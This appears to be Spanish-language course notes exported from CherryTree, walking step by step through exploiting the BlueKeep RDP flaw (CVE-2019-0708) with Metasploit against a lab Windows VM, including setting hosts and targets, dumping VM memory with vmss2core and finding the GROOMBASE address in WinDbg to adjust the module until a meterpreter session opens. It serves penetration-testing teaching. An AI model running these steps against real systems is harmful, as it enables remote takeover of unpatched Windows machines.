<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Nivel avanzado</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Nivel avanzado</h1><br/><p></p><p></p><p>Vamos a explotar alguna vulnerabilidad de la máquina windows.</p><p>Esta tiene que ver con el Remote Desktop de la máquina windows denominada BlueKeep.</p><p></p><p><img src="images/113-1.png" alt="images/113-1.png" /></p><p></p><p>Es una vulnerabilidad de una criticidad alta porque nos permitía ejecutar código de manera remota en una máquina que tuviese instalado este servicio que es muy frecuente ya que es un protocolo y un aplicación que permite controlar windows desde un escritorio remoto.</p><p></p><p></p><p>En msfconsole:</p><p></p><p><div class="codebox"><pre><br />search bluekeep</pre></div></p><p></p><p><img src="images/113-2.png" alt="images/113-2.png" /></p><p></p><p>Si nos fijamos bien a diferencia de los exploits que usamos en el apartado anterior en la zona de Rank estaban indicados como excelent o good, etc pero en este caso indica manual y esto es por la complejidad que tienen para poder configurarlos y ejecutarlos.</p><p></p><p>Quiere decir que en muchas ocasiones va a requerir que nosotros hagamos algún cambio al exploit, incluso al código fuente del exploit.</p><p></p><p>Por eso es importante conocer la estructura de ficheros para que pueda funcionar de manera adecuada.</p><p></p><p><div class="codebox"><pre><br />use exploit<span style="color:#000000;font-weight:700">/</span>windows<span style="color:#000000;font-weight:700">/</span>rdp<span style="color:#000000;font-weight:700">/</span>cve_2019_0708_bluekeep_rce<br />show options<br /></pre></div></p><p></p><p><img src="images/113-3.png" alt="images/113-3.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> lhost 192.168.20.131<br /><span style="color:#000000;font-weight:700">set</span> rhosts 192.168.20.129<br /></pre></div></p><p></p><p>Aquí nos aparece también un tema de target.</p><p></p><p><img src="images/113-4.png" alt="images/113-4.png" /></p><p></p><p><div class="codebox"><pre><br />show targets</pre></div></p><p></p><p>Podríamos configurar también el target, aunque si lo dejamos a cero va a tratar de identificar cuál es la categoría del target mediante recopilación activa.</p><p></p><p><img src="images/113-5.png" alt="images/113-5.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> target 5</pre></div></p><p></p><p>Antes de ejecutar es importante revisar la información del exploit:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">info</span></pre></div></p><p></p><p><img src="images/113-6.png" alt="images/113-6.png" /></p><p></p><p>En concreto esta parte indica que hay que poner esta clave de registro a cero que en este momento lo haremos de forma manual pero no es lo normal.</p><p></p><p><img src="images/113-7.png" alt="images/113-7.png" /></p><p></p><p><img src="images/113-8.png" alt="images/113-8.png" /></p><p></p><p><img src="images/113-9.png" alt="images/113-9.png" /></p><p></p><p><img src="images/113-10.png" alt="images/113-10.png" /></p><p></p><p><img src="images/113-11.png" alt="images/113-11.png" /></p><p></p><p>Esto se basa en inyectar código, de manera que va a cambiar el flujo de ejecución de este programa para que en lugar de ejecutar el código legítimo de esa aplicación, ejecute el código que hemos inyectado.</p><p></p><p>Ha debido de haber algún tipo de problema, porque a pesar de que se ha completado la ejecución del exploit, no ha sido capaz de crear una sesión remota.</p><p></p><p>Reintentamos.</p><p></p><p>Dice que ha tratado de hacer algún tipo de paginación.</p><p></p><p>Esto está pasando porque tal y como nos dice este exploit, cuando nosotros le damos a info nos dice que es un exploit manual y como consecuencia de ser un exploit manual, a veces va a requerir que nosotros hagamos ciertos cambios dentro del código fuente de este exploit.</p><p></p><p>Concretamente nosotros hemos tenido un fallo de paginación y lo que tenemos que hacer es que inyecte este código, en una zona donde no pagine esta memoria.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> emacs <span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>metasploit-framework<span style="color:#000000;font-weight:700">/</span>modules<span style="color:#000000;font-weight:700">/</span>exploits<span style="color:#000000;font-weight:700">/</span>windows<span style="color:#000000;font-weight:700">/</span>rdp<span style="color:#000000;font-weight:700">/</span>cve_2019_0708_bluekeep_rce.rb </pre></div></p><p></p><p><img src="images/113-12.png" alt="images/113-12.png" /></p><p></p><p>Es posible que el offset que tiene puesto la dirección de memoria que tiene puesta para inyectar ese código no coincida.</p><p>En este caso con tu máquina virtual, con una zona donde no pagine la memoria y por lo tanto falle y tengas tú que establecer la dirección de manera manual para que pueda insertar ese código en una zona de memoria adecuada donde no se produzca esta paginación y funcione bien el exploit.</p><p></p><p>Estamos utilizando este objetivo y lo que tenemos que cambiar es esta parte de aquí</p><p></p><p><img src="images/113-13.png" alt="images/113-13.png" /></p><p></p><p>Groombase es la dirección de inicio a partir de la cual va a comenzar a inyectar ese código.</p><p></p><p>Vamos a necesitar algunas herramientas adicionales para poder llevar a cabo este proceso de encontrar esa dirección de comienzo de esa parte de la memoria que no realiza paginación.</p><p></p><p>En vmware workstation pro puede venir incorporada, si no:</p><p></p><p><a href="https://drive.google.com/file/d/1x4bfCUPpaW8XBZUn4mojf9zQZ5vwnCA4/view?usp=drive_link">https://drive.google.com/file/d/1x4bfCUPpaW8XBZUn4mojf9zQZ5vwnCA4/view?usp=drive_link</a></p><p></p><p></p><p>Vamos a necesitar un debugger como winDBG.</p><p></p><p><a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/">https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/</a></p><p></p><p>El debugger necesita algún archivo de memoria, un dump de memoria sobre el que trabajar.</p><p>Lo que tenemos que hacer es coger todas las direcciones de memoria que tiene esa máquina virtual, volcarlo a un fichero y buscar entre todas esas direcciones donde se encuentra la dirección donde comienza la memoria, que no pagina.</p><p>Vamos a irnos al directorio donde está nuestra máquina virtual Windows.</p><p></p><p>Es importante que no la apaguéis la máquina sino suspenderla.</p><p></p><p>Copiamos estos archivos a un nuevo directorio:</p><p><img src="images/113-14.png" alt="images/113-14.png" /></p><p></p><p>Dentro de la carpeta donde copiamos esos archivos ejecutamos vmss2core en cmd.</p><p></p><p><div class="codebox"><pre><br />C<span style="color:#000000;font-weight:700">:\</span><span style="color:#edd400;font-weight:400">&quot;RUTA DE LA CARPETA DESCARGADA&quot;</span><span style="color:#000000;font-weight:700">\</span>vmss2core.exe<br />C<span style="color:#000000;font-weight:700">:\</span><span style="color:#edd400;font-weight:400">&quot;RUTA DE LA CARPETA DESCARGADA&quot;</span><span style="color:#000000;font-weight:700">\</span>vmss2core.exe <span style="color:#000000;font-weight:700">-</span>W <span style="color:#edd400;font-weight:400">metasploitable-win2k8-51e8b106</span>.vmss <span style="color:#edd400;font-weight:400">metasploitable-win2k8-51e8b106</span>.vmem<br /> </pre></div></p><p></p><p>Lo que va a ocurrir es que esta aplicación de VMware va a hacernos un volcado de lamemoria, que es precisamente lo que nosotros necesitamos para poder analizarlo después.</p><p></p><p>Abrimos el archivo resultante con winDGB y ejecutamos:</p><p></p><p><img src="images/113-15.png" alt="images/113-15.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">!</span>poolfind <span style="color:#ce5c00;font-weight:400">0</span></pre></div></p><p></p><p>Esto buscara la parte de la memoria que no pagina.</p><p></p><p><img src="images/113-16.png" alt="images/113-16.png" /></p><p></p><p>En este caso solo nos interesa la primera de las dos.</p><p></p><p>Volvemos al archivo del exploit en kali y:</p><p></p><p><img src="images/113-17.png" alt="images/113-17.png" /></p><p></p><p>Para volver a cargar el exploit simplemente cerramos y abrimos metasploit de nuevo.</p><p></p><p>Configuramos de nuevo el exploit y agregamos un último parámetro:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> groomsize 50 </pre></div></p><p></p><p><img src="images/113-18.png" alt="images/113-18.png" /></p><p></p><p></p><p>Un meterpreter tiene características más avanzadas que un shell normal.</p></div>
</body>
</html>
